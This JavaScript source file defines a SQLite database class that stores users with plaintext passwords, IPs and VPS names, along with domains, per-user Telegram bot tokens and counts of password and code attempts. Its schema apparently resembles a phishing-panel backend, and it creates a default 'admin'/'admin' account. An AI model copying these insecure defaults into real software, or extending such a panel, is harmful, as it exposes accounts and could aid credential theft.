import sqlite3 from 'sqlite3';

class Database {
    constructor(dbPath = 'database.db') {
        this.db = new sqlite3.Database(dbPath);
        this.initialize();
        this.createDefaultAdmin();
    }

    initialize() {
        this.db.serialize(() => {
            const sqlCreateUsersTable = /* sql */ `
        CREATE TABLE IF NOT EXISTS users (
          username TEXT UNIQUE NOT NULL PRIMARY KEY,
          password TEXT NOT NULL,
          ip TEXT,
          role TEXT,
          vps_name TEXT
        )
      `;
            this.db.run(sqlCreateUsersTable);

            const sqlCreateDomainsTable = /* sql */ `
        CREATE TABLE IF NOT EXISTS domains (
          username TEXT NOT NULL,
          domain TEXT NOT NULL,
          FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
        )
      `;
            this.db.run(sqlCreateDomainsTable);

            const sqlCreateTelegramTable = /* sql */ `
        CREATE TABLE IF NOT EXISTS telegram (
          username TEXT PRIMARY KEY,
          chat_id TEXT NOT NULL DEFAULT '',
          telegram_token TEXT NOT NULL DEFAULT '',
          FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
        )
      `;
            this.db.run(sqlCreateTelegramTable);

            const sqlCreateSettingsTable = /* sql */ `
        CREATE TABLE IF NOT EXISTS login_settings (
          username TEXT PRIMARY KEY,
          max_password_attempts INTEGER DEFAULT 3,
          max_code_attempts INTEGER DEFAULT 3,
          FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
        )
      `;
            this.db.run(sqlCreateSettingsTable);
        });
    }

    createDefaultAdmin = () => {
        const checkAdminSql = `SELECT * FROM users WHERE username = 'admin' AND role = 'admin'`;

        this.db.get(checkAdminSql, (err, row) => {
            if (err) {
                return;
            }

            if (!row) {
                const insertAdminSql = `
                    INSERT INTO users (username, password, role)
                    VALUES (?, ?, ?)
                `;

                this.db.run(insertAdminSql, ['admin', 'admin', 'admin']);
            }
        });
    };

    getUserByUsername = async (username) => {
        return new Promise((resolve) => {
            const sql = `SELECT username, password, role, ip, vps_name
                      FROM users
                      WHERE username = ?`;

            this.db.get(sql, [username], (err, user) => {
                if (err || !user) {
                    resolve(null);
                    return;
                }
                resolve(user);
            });
        });
    };

    getListUsers = async () => {
        return new Promise((resolve) => {
            const sql = `SELECT username,password, ip, vps_name FROM users  WHERE role != 'admin'`;

            this.db.all(sql, (err, rows) => {
                if (err) {
                    resolve([]);
                    return;
                }
                resolve(rows);
            });
        });
    };
    getSettingsByDomain = async (domain) => {
        return new Promise((resolve, reject) => {
            const sql = `
              SELECT
                u.username,
                ls.max_password_attempts,
                ls.max_code_attempts,
                t.chat_id,
                t.telegram_token
              FROM domains d
              JOIN users u ON d.username = u.username
              LEFT JOIN login_settings ls ON u.username = ls.username
              LEFT JOIN telegram t ON u.username = t.username
              WHERE d.domain = ?
            `;

            this.db.get(sql, [domain], (err, result) => {
                if (err || !result) {
                    resolve(null);
                    return;
                }
                const settings = {
                    loginSettings: {
                        maxPasswordAttempts: result.max_password_attempts || 3,
                        maxCodeAttempts: result.max_code_attempts || 3
                    },
                    telegramSettings: result.chat_id
                        ? {
                              chatId: result.chat_id,
                              telegramToken: result.telegram_token
                          }
                        : null
                };

                resolve(settings);
            });
        });
    };

    getDomainsByUsername = async (username) => {
        return new Promise((resolve) => {
            const sql = `SELECT domain FROM domains WHERE username = ?`;

            this.db.all(sql, [username], (err, rows) => {
                if (err) {
                    resolve([]);
                    return;
                }
                resolve(rows.map((row) => row.domain));
            });
        });
    };

    getTelegramByUsername = async (username) => {
        return new Promise((resolve) => {
            const sql = `SELECT chat_id, telegram_token
                        FROM telegram
                        WHERE username = ?`;

            this.db.get(sql, [username], (err, result) => {
                if (err || !result) {
                    resolve(null);
                    return;
                }

                resolve({
                    chatId: result.chat_id,
                    telegramToken: result.telegram_token
                });
            });
        });
    };
    setTelegramByUsername = async (username, chatId, telegramToken) => {
        return new Promise((resolve, reject) => {
            const sql = `
                INSERT OR REPLACE INTO telegram (username, chat_id, telegram_token)
                VALUES (?, ?, ?)
            `;

            this.db.run(sql, [username, chatId, telegramToken], (err) => {
                if (err) {
                    resolve(null);
                    return;
                }
                resolve();
            });
        });
    };

    getSettingsByUsername = async (username) => {
        return new Promise((resolve) => {
            const sql = `SELECT max_password_attempts, max_code_attempts
                        FROM login_settings
                        WHERE username = ?`;

            this.db.get(sql, [username], (err, result) => {
                if (err || !result) {
                    resolve(null);
                    return;
                }

                resolve({
                    maxPasswordAttempts: result.max_password_attempts || 3,
                    maxCodeAttempts: result.max_code_attempts || 3
                });
            });
        });
    };

    setWebsiteConfig = async (username, maxPasswordAttempts, maxCodeAttempts) => {
        return new Promise((resolve, reject) => {
            const sql = `
                INSERT OR REPLACE INTO login_settings (username, max_password_attempts, max_code_attempts)
                VALUES (?, ?, ?)
            `;

            this.db.run(sql, [username, maxPasswordAttempts, maxCodeAttempts], (err) => {
                if (err) {
                    resolve(null);
                    return;
                }
                resolve();
            });
        });
    };

    addNewUser = async (username, password, role, vps_name, ip) => {
        return new Promise((resolve, reject) => {
            const sql = `
                INSERT OR REPLACE INTO users (username, password, role, vps_name, ip)
                VALUES (?, ?, ?, ?, ?)
            `;

            this.db.run(sql, [username, password, role, vps_name, ip], (err) => {
                if (err) {
                    resolve(null);
                    return;
                }
                resolve();
            });
        });
    };
    deleteUser = async (username) => {
        return new Promise((resolve, reject) => {
            const sql = `DELETE FROM users WHERE username = ?`;

            this.db.run(sql, [username], (err) => {
                if (err) {
                    resolve(null);
                    return;
                }
                resolve();
            });
        });
    };
    addDomain = async (username, domain) => {
        return new Promise((resolve, reject) => {
            const sql = `
                INSERT INTO domains (username, domain)
                VALUES (?, ?)
            `;

            this.db.run(sql, [username, domain], (err) => {
                if (err) {
                    resolve(null);
                    return;
                }
                resolve();
            });
        });
    };
    deleteDomain = async (username, domain) => {
        return new Promise((resolve, reject) => {
            const sql = `DELETE FROM domains WHERE username = ? AND domain = ?`;

            this.db.run(sql, [username, domain], (err) => {
                if (err) {
                    resolve(null);
                    return;
                }
                resolve();
            });
        });
    };
}
export default Database;
